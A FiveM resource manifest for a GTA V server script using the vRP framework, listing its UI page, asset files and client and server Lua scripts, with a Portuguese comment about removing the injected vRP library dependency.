client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version "cerulean"
game "gta5"

ui_page_preload 'yes'

ui_page "nui/index.html"

files {
	"nui/index.html",
	"nui/lib/*.js",
	"nui/lib/*.css",
	"nui/*.js",
	"nui/*.css",
	"nui/sounds/*.ogg",
}

client_scripts {
	"config.lua",
	"client.lua"
} 

server_script {
	"server.lua"
}

              